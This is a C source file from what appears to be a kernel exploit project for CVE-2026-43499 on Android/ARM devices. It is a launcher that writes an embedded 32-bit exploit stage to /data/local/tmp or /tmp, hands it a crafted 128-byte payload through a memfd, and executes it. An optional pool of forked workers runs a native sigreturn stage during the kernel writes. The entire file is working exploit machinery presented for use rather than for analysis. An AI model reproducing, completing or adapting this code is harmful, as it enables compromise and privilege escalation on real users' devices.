/*
 * api.c — launcher for the embedded 32-bit CVE-2026-43499 stage.
 *
 * Provides:
 *   int exp_stack_once(uint64_t *buffer);
 *
 * The caller prepares a 16-word (128-byte) payload buffer and this
 * function hands it to the embedded armeabi-v7a binary:
 *
 *   1. install_embedded_exp32() writes the embedded binary to a
 *      guest-writable path (once per process);
 *   2. the buffer is stored in an inheritable memfd (no temp files);
 *   3. the child execve()s the 32-bit stage with the memfd number as
 *      argv[1] and the 64-bit side waits for it to finish.
 *
 * Returns the child's exit status, -1 on setup error, -2 if the
 * embedded binary could not be installed/exec'd.
 */

#include "common.h"

/* Embedded 32-bit stage (see src/exp32_blob.S). */
extern const char embedded_exp32_start[];
extern const char embedded_exp32_end[];

/* Payload size: 16 uint64_t words (see src/exp32/main.c). */
#define EXP_BUFFER_BYTES 128

#ifdef USE_NATIVE_SIGRETURN_STAGE
#define NATIVE_WORKER_MAX 12

struct native_stage_worker {
  pid_t pid;
  int command_fd;
  int result_fd;
};

static struct native_stage_worker native_workers[NATIVE_WORKER_MAX];
static size_t native_worker_count;
static size_t native_worker_next;

static ssize_t transfer_full(int fd, void *buffer, size_t size, int writing) {
  size_t offset = 0;
  while (offset < size) {
    ssize_t done = writing
        ? write(fd, (const char *)buffer + offset, size - offset)
        : read(fd, (char *)buffer + offset, size - offset);
    if (done < 0 && errno == EINTR)
      continue;
    if (done <= 0)
      return done;
    offset += (size_t)done;
  }
  return (ssize_t)offset;
}

int songyuan_native_workers_prepare(size_t count) {
  if (!count || count > NATIVE_WORKER_MAX || native_worker_count) {
    pr_warning("native worker prepare invalid count=%zu existing=%zu\n",
               count, native_worker_count);
    return 0;
  }

  /* A worker can fail before reading its command.  Report EPIPE to the
   * launcher instead of letting the default SIGPIPE action terminate it. */
  (void)signal(SIGPIPE, SIG_IGN);

  int command[NATIVE_WORKER_MAX][2];
  int result[NATIVE_WORKER_MAX][2];
  pid_t pids[NATIVE_WORKER_MAX];
  memset(command, -1, sizeof(command));
  memset(result, -1, sizeof(result));
  memset(pids, 0, sizeof(pids));

  for (size_t i = 0; i < count; ++i) {
    if (pipe2(command[i], O_CLOEXEC) != 0 ||
        pipe2(result[i], O_CLOEXEC) != 0) {
      pr_warning("native worker pipe index=%zu errno=%d\n", i, errno);
      goto fail;
    }
  }

  for (size_t i = 0; i < count; ++i) {
    pid_t pid = fork();
    if (pid < 0) {
      pr_warning("native worker fork index=%zu errno=%d\n", i, errno);
      goto fail;
    }
    if (pid == 0) {
      (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
      if (getppid() == 1)
        _exit(1);
      for (size_t j = 0; j < count; ++j) {
        close(command[j][1]);
        close(result[j][0]);
        if (j != i) {
          close(command[j][0]);
          close(result[j][1]);
        }
      }
      uint64_t payload[EXP_BUFFER_BYTES / sizeof(uint64_t)];
      if (transfer_full(command[i][0], payload, sizeof(payload), 0) !=
          (ssize_t)sizeof(payload))
        _exit(1);
      close(command[i][0]);
      int rc = getenv("TICKERBAR_WORKER_SELFTEST")
          ? 0
          : songyuan_native_sigreturn_stage(payload);
      (void)transfer_full(result[i][1], &rc, sizeof(rc), 1);
      close(result[i][1]);
      _exit(rc == 0 ? 0 : 1);
    }
    pids[i] = pid;
  }

  for (size_t i = 0; i < count; ++i) {
    close(command[i][0]);
    close(result[i][1]);
    native_workers[i].pid = pids[i];
    native_workers[i].command_fd = command[i][1];
    native_workers[i].result_fd = result[i][0];
  }
  native_worker_count = count;
  native_worker_next = 0;
  pr_info("native workers prepared count=%zu before kernel writes\n", count);
  return 1;

fail:
  for (size_t i = 0; i < count; ++i) {
    if (pids[i] > 0)
      (void)kill(pids[i], SIGKILL);
    for (int end = 0; end < 2; ++end) {
      if (command[i][end] >= 0)
        close(command[i][end]);
      if (result[i][end] >= 0)
        close(result[i][end]);
    }
  }
  for (size_t i = 0; i < count; ++i) {
    if (pids[i] > 0)
      while (waitpid(pids[i], NULL, 0) < 0 && errno == EINTR) {}
  }
  return 0;
}
#endif

static const char *exp32_local_path(void) {
  static char path[256];
  if (!path[0]) {
    if (access("/data/local/tmp", W_OK) == 0) {
      snprintf(path, sizeof(path), "/data/local/tmp/cve-exp32");
    } else {
      snprintf(path, sizeof(path), "/tmp/cve-exp32");
    }
  }
  return path;
}

/*
 * install_embedded_exp32 — drop the embedded armeabi-v7a exploit stage
 * to a guest-writable path so exp_stack_once() can execve() it.
 */
int install_embedded_exp32(void) {
  static int installed;
  if (installed) {
    return 1;
  }

  const char *dest = exp32_local_path();
  size_t size = (size_t)(embedded_exp32_end - embedded_exp32_start);
  int fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    pr_warning("install_embedded_exp32: open %s errno=%d\n", dest, errno);
    return 0;
  }
  size_t off = 0;
  while (off < size) {
    ssize_t n = write(fd, embedded_exp32_start + off, size - off);
    if (n <= 0) {
      pr_warning("install_embedded_exp32: write errno=%d\n", errno);
      close(fd);
      return 0;
    }
    off += (size_t)n;
  }
  close(fd);
  chmod(dest, 0755);
  installed = 1;
  pr_info("install_embedded_exp32: %s (%zu bytes)\n", dest, size);
  return 1;
}

int exp_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("exp_stack_once: NULL buffer\n");
    return -1;
  }

#ifdef USE_NATIVE_SIGRETURN_STAGE
  if (!native_worker_count || native_worker_next >= native_worker_count) {
    pr_warning("exp_stack_once: native worker unavailable used=%zu count=%zu\n",
               native_worker_next, native_worker_count);
    return -1;
  }
  struct native_stage_worker *worker = &native_workers[native_worker_next++];
  pr_info("native worker dispatch index=%zu pid=%d\n",
          native_worker_next - 1, (int)worker->pid);
  if (transfer_full(worker->command_fd, buffer, EXP_BUFFER_BYTES, 1) !=
      EXP_BUFFER_BYTES) {
    pr_warning("exp_stack_once: worker command index=%zu errno=%d\n",
               native_worker_next - 1, errno);
    close(worker->command_fd);
    worker->command_fd = -1;
    return -1;
  }
  close(worker->command_fd);
  worker->command_fd = -1;
  int rc = -1;
  ssize_t result_size = transfer_full(worker->result_fd, &rc, sizeof(rc), 0);
  pr_info("native worker result index=%zu size=%zd rc=%d\n",
          native_worker_next - 1, result_size, rc);
  close(worker->result_fd);
  worker->result_fd = -1;
  int native_status = 0;
  pid_t waited;
  do {
    waited = waitpid(worker->pid, &native_status, 0);
  } while (waited < 0 && errno == EINTR);
  if (result_size == (ssize_t)sizeof(rc) && waited == worker->pid &&
      WIFEXITED(native_status) && WEXITSTATUS(native_status) == 0) {
    pr_info("native worker reaped index=%zu status=%d\n",
            native_worker_next - 1, native_status);
    return rc;
  }
  if (waited == worker->pid && WIFSIGNALED(native_status))
    pr_warning("exp_stack_once: native worker killed by signal %d\n",
               WTERMSIG(native_status));
  else
    pr_warning("exp_stack_once: native worker failed result=%zd rc=%d status=%d\n",
               result_size, rc, native_status);
  return -1;
#else

  if (!install_embedded_exp32()) {
    pr_warning("exp_stack_once: embedded exp32 install failed errno=%d\n",
               errno);
    return -2;
  }

  /* Inheritable by default (no MFD_CLOEXEC): the exec'd child reads it. */
  int mfd = (int)syscall(__NR_memfd_create, "exp_buf", 0);
  if (mfd < 0) {
    pr_warning("exp_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("exp_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("exp_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }

  if (pid == 0) {
    char fd_arg[16];
    const char *path = exp32_local_path();
    snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
    execl(path, path, fd_arg, (char *)NULL);
    /* execl only returns on error. */
    pr_warning("exp_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }

  int status;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  close(mfd);

  if (WIFEXITED(status)) {
    int exit_code = WEXITSTATUS(status);
    if (exit_code == 127) {
      pr_warning("exp_stack_once: executable not found at %s\n",
                 exp32_local_path());
      return -2;
    }
    return exit_code;
  }

  if (WIFSIGNALED(status)) {
    pr_warning("exp_stack_once: child killed by signal %d\n",
               WTERMSIG(status));
  }
  return -1;
#endif
}
